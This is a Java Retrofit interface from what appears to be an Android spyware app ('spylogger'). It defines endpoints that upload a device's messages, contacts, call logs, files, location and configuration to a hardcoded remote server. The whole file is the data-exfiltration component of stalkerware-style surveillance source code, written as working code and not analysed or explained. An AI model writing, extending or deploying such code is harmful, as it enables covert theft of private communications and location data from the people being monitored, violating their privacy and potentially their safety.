package com.gravatasufoca.spylogger.services;

import com.gravatasufoca.spylogger.model.Ligacao;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;
import com.gravatasufoca.spylogger.vos.ContatoVO;
import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
import com.gravatasufoca.spylogger.vos.LocalizacaoVO;
import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;
import com.gravatasufoca.spylogger.vos.UsuarioVO;

import java.util.List;

import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;
import retrofit2.http.Path;

/**
 * Created by bruno on 01/12/16.
 */

public interface SendDataInterface {

//    String ip="172.24.35.147";
    String ip="192.168.1.118";

    String apiUrl="http://"+ip+"/smartlog/api/v1/";

    @POST(apiUrl+"receber/topicos")
    Call<RespostaRecebimentoVO> enviarTopicos(@Body List<Topico> topicos);

    @POST(apiUrl+"receber/contatos")
    Call<RespostaRecebimentoVO> enviarContatos(@Body List<ContatoVO> contatos);

    @POST(apiUrl+"receber/mensagens")
    Call<RespostaRecebimentoVO> enviarMensagens(@Body List<Mensagem> mensagens);

    @POST(apiUrl+"receber/ligacoes")
    Call<RespostaRecebimentoVO> enviarLigacoes(@Body List<Ligacao> ligacoes);

    @Multipart
    @POST(apiUrl+"receber/arquivo")
    Call<Boolean> enviarArquivo(@Part("arquivo\"; filename=\"arquivo\" ") RequestBody arquivo, @Part("envioArquivoVo") EnvioArquivoVO envioArquivoVO);

    @POST(apiUrl+"fcm/conectado")
    Call<Boolean> enviarAtivo(@Body EnvioArquivoVO envioArquivoVO);

    @POST(apiUrl+"receber/arquivo/localizacao")
    Call<Boolean> enviarLocalizacao(@Body LocalizacaoVO envioArquivoVO);

    @POST(apiUrl+"receber/configuracao")
    Call<Boolean> enviarConfiguracao(@Body ConfiguracaoVO configuracaoVO);

    @POST(apiUrl+"receber/arquivo/existe")
    Call<Boolean> notificarExistencia(@Body EnvioArquivoVO envioArquivoVO);

    @POST(apiUrl+"usuario")
    Call<UsuarioVO> inserirUsuario(@Body UsuarioVO usuarioVO);

    @POST(apiUrl+"usuario/perfil/{id}/{chave}")
    Call<UsuarioVO> inserirChave(@Path("id") Integer idAparelho, @Path("chave") String chave);

    @POST(apiUrl+"receber/send")
    Call<List<Integer>> receberArquivos(@Body EnvioArquivoVO envioArquivoVO);

}
